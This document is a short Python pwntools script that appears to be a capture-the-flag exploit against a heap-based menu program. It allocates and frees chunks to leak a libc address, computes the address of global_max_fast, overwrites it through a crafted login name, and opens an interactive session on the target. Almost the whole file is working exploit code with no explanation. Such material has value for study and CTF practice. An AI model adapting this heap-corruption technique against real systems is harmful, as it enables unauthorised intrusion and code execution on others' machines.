from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)

def create_order(size, dat):
  s.recvuntil('4.exit')
  s.sendline('1')
  s.recvuntil('size')
  s.sendline(str(size))
  s.recvuntil('note')
  s.send(dat)

def delete_order(index):
  s.recvuntil('4.exit')
  s.sendline('2')
  s.recvuntil('id:')
  s.sendline(str(index))

def login(dat):
  s.recvuntil('4.exit')
  s.sendline('3')
  s.recvuntil('name')
  s.send(dat)

create_order(0x100,'A'*0x100)
create_order(0x100,'A'*0x100)
delete_order(0)
create_order(0x100,"\n")
libc = u64(s.recvuntil('\x7f')[-6:]+"\x00\x00") - 0x3c4b78
global_max_fast = libc+ 0x3c67f8
print "LIBC : ",hex(libc)
login("A"*0x8+p64(global_max_fast-0x8-7))
s.recvuntil('1.admin')
s.sendline('0')
s.interactive()
